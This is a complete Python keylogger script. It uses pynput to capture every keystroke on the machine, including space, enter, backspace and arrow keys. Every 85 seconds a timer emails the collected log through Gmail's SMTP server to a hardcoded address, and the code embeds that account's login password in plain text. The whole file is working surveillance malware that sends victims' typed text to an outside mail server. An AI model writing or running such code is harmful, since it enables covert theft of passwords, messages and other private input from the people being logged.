from pynput import keyboard
import threading
import smtplib

print("Started")
log = "key logger started \n"
time_interval = 85
def on_press(key):
    global log
    try:
        log = log+str(key.char)
    except:
        if (key==key.space):
            log = log + " "    

        elif (key==key.backspace):
            log = log + "|key.backspace|"

        elif(key==key.enter):
            log = log + "|key.enter|"

        elif(key==key.up):
            log = log + "|key.up|"        
        elif(key==key.down):
            log = log + "|key.down|"        
        elif(key==key.left):
            log = log + "|key.left|"        
        elif(key==key.right):
            log = log + "|key.right|" 
        else:
            log = log + "|" + str(key) + "|"    

    # print(log)
    
def report():
    global log
    
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.ehlo()
    server.starttls()
    server.login("syedfardin83@gmail.com", "fardin@123")
    server.sendmail("syedfardin83@gmail.com", "syedfardin83@gmail.com", log)
    server.quit()

    log = ""
    timer = threading.Timer(time_interval, report)
    timer.start()

with keyboard.Listener(on_press=on_press) as listener:
    report()
    listener.join()